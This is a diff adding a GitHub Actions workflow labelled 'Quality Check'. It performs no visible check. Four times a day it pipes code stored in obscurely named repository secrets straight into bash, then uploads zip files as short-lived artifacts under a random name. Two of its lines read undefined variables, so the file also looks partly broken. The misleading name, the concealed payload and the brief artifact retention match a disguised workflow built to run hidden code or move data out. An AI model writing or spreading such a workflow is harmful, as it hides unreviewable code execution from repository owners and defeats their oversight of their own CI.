@@ -1,0 +1,28 @@
+name: Quality Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '29 4,10,16,22 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  action:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Begin
+        env:
+          jsto08: ${{ secrets.jsto08 }}
+        run: |
+          printf '%s' "$jsto08" | jq -r .hpgnw870 | /bin/bash
+          printf '%s' "$fb8" | jq -r .if3 | /bin/bash
+          printf '%s' "$qcci84961" | jq -r .t2 | /bin/bash
+
+      - name: Save results
+        uses: actions/upload-artifact@v4
+        with:
+          name: AnKuBl6w
+          path: "*.zip"
+          retention-days: 1
